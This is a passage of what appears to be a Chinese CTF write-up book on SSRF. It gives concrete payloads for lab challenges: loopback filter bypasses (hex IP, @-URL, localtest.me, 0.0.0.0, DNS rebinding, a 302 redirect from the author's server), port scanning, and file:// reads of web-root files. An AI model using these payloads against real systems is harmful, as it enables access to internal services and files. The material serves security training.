+<p>也就是：<code>http://www.xxx.com@www.yyy.com</code>  形式</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="err">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f81fd58cb8da5c8cbdaf9.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-11.md -->
+<h3 id="ip">IP 转十六进制绕过<a class="headerlink" href="#ip" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68803b8258cb8da5c8cc9a1a.png"></p>
+<p>尝试将 <code>127.0.0.1</code> 转换为**十六进制**形式，也就是 <code>0x7f000001</code></p>
+<p>构造题目有所需 Payload：<code>?url=0x7f000001/flag.php</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68803ce858cb8da5c8cc9aca.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-12.md -->
+<h3 id="localhost-ip">localhost 代替 IP 绕过<a class="headerlink" href="#localhost-ip" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68803f2a58cb8da5c8cca2cf.png"></p>
+<p>使用 <code>localhost</code> 代替 <code>127.0.0.1</code> 绕过</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68803f7f58cb8da5c8cca31e.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-13.md -->
+<h3 id="dns">DNS 重绑定绕过<a class="headerlink" href="#dns" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6880442c58cb8da5c8cca8d9.png"></p>
+<p><strong>🔍 什么是 DNS 重绑定（DNS Rebinding）？</strong></p>
+<p>DNS 重绑定是一种攻击手法，通过操控域名解析结果，使浏览器访问原本受同源策略保护的内网地址或本地服务</p>
+<p>攻击者注册一个域名 → 利用 DNS 控制域名解析结果 → 浏览器认为是同源 → 访问受保护资源</p>
+<p><strong>🧠 攻击流程简图</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>受害者浏览器访问 attacker.com
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>        ↓
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>第一次 DNS 返回 attacker.com → 1.2.3.4（攻击者服务器）
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>        ↓
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>浏览器加载恶意脚本
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>        ↓
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>第二次 DNS 返回 attacker.com → 127.0.0.1 / 内网 IP
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>        ↓
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>脚本利用同源策略访问本地/内网服务
+</code></pre></div>
+<p><a href="https://lock.cmpxchg8b.com/rebinder.html">打开网站</a></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68804a4558cb8da5c8ccd017.png"></p>
+<p>复制下面那块代码拿到 flag</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68804a8458cb8da5c8ccd130.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-2.md -->
+<h3 id="ip_1">域名代替 IP 绕过<a class="headerlink" href="#ip_1" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166abe58cb8da5c8da0592.png"></p>
+<p>打开网页不让 F12 以及右键</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166ab358cb8da5c8da0591.png"></p>
+<p>Ctrl + U 发现有个 PHP 文件</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166b0a58cb8da5c8da059e.png"></p>
+<p>访问页面后再次查看源码给出了提示</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166b4958cb8da5c8da05a8.png"></p>
+<p><a href="https://github.com/s0md3v/Arjun?tab=readme-ov-file">安装工具</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>pip<span class="w"> </span>install<span class="w"> </span>arjun
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166bab58cb8da5c8da05b0.png"></p>
+<p>执行命令</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>arjun<span class="w"> </span>-u<span class="w"> </span>http://challenge.qsnctf.com:31303/c3s4f.php
+</code></pre></div>
+<p>可以发现有个 <code>shell</code> 参数</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166c4c58cb8da5c8da05c4.png"></p>
+<p>传入参数给出了新提示</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166cbb58cb8da5c8da05d0.png"></p>
+<p>扫描目录发现有个 <code>secret.php</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166dab58cb8da5c8da05e3.png"></p>
+<p>只允许本地访问</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166d8958cb8da5c8da05dd.png"></p>
+<p>结合提示以为是要伪造 XFF 或者 Client-IP，试过了都不行</p>
+<p>利用 <code>shell</code> 参数构造 SSRF</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="err">?shell=http://127.0.0.1/secret.php</span>
+</code></pre></div>
+<p>无果</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166e4e58cb8da5c8da05ef.png"></p>
+<p>使用域名跳转绕过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="err">?shell=http://localtest.me/secret.php</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166ec458cb8da5c8da05fa.png"></p>
+<p>访问拿到源码</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68166f2258cb8da5c8da0601.png"></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">include</span><span class="p">(</span><span class="s1">'k4y.php'</span><span class="p">);</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="k">include_once</span><span class="p">(</span><span class="s1">'flag.php'</span><span class="p">);</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1">// Challenge 1</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'DrKn'</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'DrKn'</span><span class="p">];</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>        <span class="k">echo</span> <span class="s2">"有点东西呢"</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="o">.</span><span class="nv">$key1</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="p">;</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>        <span class="k">die</span><span class="p">(</span><span class="s2">"貌似状态不在线啊(╯_╰)&lt;/br&gt;"</span><span class="p">);</span>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>    <span class="p">}</span>
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="p">}</span> 
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="c1">// Challenge 2</span>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$key1</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>    <span class="nv">$damei</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$key1</span><span class="p">];</span>
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">hash</span><span class="p">(</span><span class="s2">"md4"</span><span class="p">,</span> <span class="nv">$damei</span><span class="p">)</span> <span class="o">==</span> <span class="nv">$damei</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>        <span class="k">echo</span> <span class="s2">"又近了一步呢，宝~"</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="o">.</span><span class="nv">$key2</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="o">.</span><span class="nv">$key3</span><span class="p">;</span>
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>        <span class="k">die</span><span class="p">(</span><span class="s2">"达咩哟~"</span><span class="p">);</span>
+<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>    <span class="p">}</span>
+<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a><span class="p">}</span> 
+<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>
+<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>
+<a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="c1">// Challenge 3</span>
+<a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$key2</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$key3</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$key2</span><span class="p">];</span>
+<a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>    <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$key3</span><span class="p">];</span>
+<a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>
+<a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a>          <span class="k">die</span><span class="p">(</span><span class="s2">"还得练"</span><span class="p">);</span>
+<a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a>      <span class="p">}</span>
+<a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>     <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">!==</span> <span class="nv">$pass</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">))</span> <span class="p">{</span>  
+<a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a>          <span class="k">echo</span> <span class="s2">"还不错哦"</span><span class="o">.</span><span class="s2">"</span><span class="si">$flag</span><span class="s2">"</span><span class="p">;</span>
+<a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a>      <span class="p">}</span>
+<a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a>      <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a>          <span class="k">die</span><span class="p">(</span><span class="s2">"nonono"</span><span class="p">)</span> <span class="p">;</span>
+<a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a>      <span class="p">}</span>
+<a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a>    <span class="p">}</span>
+<a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a>
+<a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>第一关就是传入给出的 Key，但是需要用到 <code>data</code> 伪协议</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6816712558cb8da5c8da0628.png"></p>
+<p>第二关是一个 <code>md4</code> 的弱比较绕过，其实可以通过科学计算法比较绕过</p>
+<p>也就是说要找一个明文是一个科学计算法 0e 开头的，然后其加密也是 0e 开头后面都是数字</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="err">&amp;M_ore.8=0e001233333333333334557778889</span>
+</code></pre></div>
+<p>最后一关就是 <code>md5</code> 强比较绕过，都为数组即可</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681671c258cb8da5c8da0638.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-3.md -->
+<h3 id="302">302 跳转绕过<a class="headerlink" href="#302" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/686453bf58cb8da5c885d754.png"></p>
+<p>访问环境时显示 url 不存在</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/686454c258cb8da5c885d82d.png"></p>
+<p>构造 url 测试</p>
+<p><img alt="img" src="https://github.com/Jason1314Zhang/BUUCTF-WP/raw/main/N1BOOK/images/ssrf2-2.png"></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864565e58cb8da5c885d9c5.png"></p>
+<p>发现可以访问百度，根据题目提示说</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864568758cb8da5c885d9c6.png"></p>
+<p>我们就访问容器内部的 8000 端口，但是有过滤 <code>127.0.0.1</code> 及 <code>localhost</code></p>
+<p>利用服务器构造 302 跳转绕过</p>
+<p>在自己的服务器构建 <code>302.php</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="err">url=http://{your_server}/302.php</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">header</span><span class="p">(</span><span class="s2">"location: http://127.0.0.1:8000/api/internal/secret"</span><span class="p">)</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864570858cb8da5c885d9d3.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-4.md -->
+<h3 id="12700x-ip">127.0.0.x 代替 IP 绕过<a class="headerlink" href="#12700x-ip" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/686453bf58cb8da5c885d754.png"></p>
+<p>访问环境时显示 url 不存在</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/686454c258cb8da5c885d82d.png"></p>
+<p>构造 url 测试</p>
+<p><img alt="img" src="https://github.com/Jason1314Zhang/BUUCTF-WP/raw/main/N1BOOK/images/ssrf2-2.png"></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864565e58cb8da5c885d9c5.png"></p>
+<p>发现可以访问百度，根据题目提示说</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864568758cb8da5c885d9c6.png"></p>
+<p>我们就访问容器内部的 8000 端口，但是有过滤 <code>127.0.0.1</code> 及 <code>localhost</code></p>
+<p>采用 <code>127.0.0.x</code> 的形式绕过，x 为 <code>2~255</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/686457d758cb8da5c885d9f3.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-5.md -->
+<h3 id="0000-ip">0.0.0.0 代替 IP 绕过<a class="headerlink" href="#0000-ip" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/686453bf58cb8da5c885d754.png"></p>
+<p>访问环境时显示 url 不存在</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/686454c258cb8da5c885d82d.png"></p>
+<p>构造 url 测试</p>
+<p><img alt="img" src="https://github.com/Jason1314Zhang/BUUCTF-WP/raw/main/N1BOOK/images/ssrf2-2.png"></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864565e58cb8da5c885d9c5.png"></p>
+<p>发现可以访问百度，根据题目提示说</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864568758cb8da5c885d9c6.png"></p>
+<p>我们就访问容器内部的 8000 端口，但是有过滤 <code>127.0.0.1</code> 及 <code>localhost</code></p>
+<p>采用 <code>0.0.0.0</code> 的形式绕过</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6864588e58cb8da5c885da0c.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-6.md -->
+<h3 id="_2">端口扫描<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f039058cb8da5c8cac8d0.png"></p>
+<p>url 参数存在 SSRF 漏洞</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f03db58cb8da5c8cac902.png"></p>
+<p>使用 BurpSuite 抓包遍历端口做扫描</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f049458cb8da5c8cac96e.png"></p>
+<p>8255 长度不一样，推测端口开着的，看响应拿到 flag</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f052958cb8da5c8cacae7.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-7.md -->
+<h3 id="gopher-http">gopher 协议伪造 HTTP 请求<a class="headerlink" href="#gopher-http" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f193f58cb8da5c8caf5e1.png"></p>
+<p>老样子直接访问 <code>127.0.0.1/flag.php</code>，回显一个输入框</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f19ad58cb8da5c8caf5ea.png"></p>
+<p>查看源码拿到一个 Key 值</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f1a1058cb8da5c8caf5f3.png"></p>
+<p>输入后回车，提示仅限 <code>127.0.0.1</code> 查看</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f1c3058cb8da5c8caf6aa.png"></p>
+<p>我们尝试用 file:// 读取文件,得到如下代码：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="err">?url=file:///var/www/html/index.php</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">])){</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /?url=_"</span><span class="p">);</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>    <span class="k">exit</span><span class="p">;</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="p">}</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="c1">// 初始化 cURL，这是 PHP 提供的一个发起 HTTP 请求的库，底层可以发起 HTTP、HTTPS、FTP、gopher 等协议的请求</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="c1">// 将用户传入的 url 参数直接传给 cURL 请求目标</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="c1">// CURLOPT_HEADER: 0 不返回响应头</span>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="c1">// CURLOPT_FOLLOWLOCATION, 1: 如果目标返回 3xx 跳转，cURL 会自动跟随跳转</span>
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="c1">// 执行请求</span>
+<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>
+<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="c1">// 关闭连接，释放资源</span>
+<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</code></pre></div>
+<p>再读取 <code>flag.php</code> 的</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="err">?url=file:///var/www/html/flag.php</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="c1">// 关闭所有错误报告，防止泄露敏感信息</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="c1">// 判断请求来源 IP 是否为本地地址 127.0.0.1</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>    <span class="c1">// 如果不是本地访问，直接提示并终止脚本</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>    <span class="k">echo</span> <span class="s2">"Just View From 127.0.0.1"</span><span class="p">;</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>    <span class="k">return</span><span class="p">;</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="p">}</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="c1">// 从环境变量中获取 flag（一般在靶场环境中设置）</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="nv">$flag</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">"CTFHUB"</span><span class="p">);</span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="c1">// 对 flag 做 MD5 哈希，得到 key</span>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="nv">$key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="c1">// 判断用户是否通过 POST 提交了 "key"，并且值与服务器计算的 $key 相同</span>
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"key"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"key"</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>    <span class="c1">// 如果提交正确，返回 flag</span>
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>  <span class="c1">// 当 post 传值为 key 时出 flag</span>
+<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>    <span class="k">exit</span><span class="p">;</span>
+<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="p">}</span>
+<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a><span class="cp">?&gt;</span>
+<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>
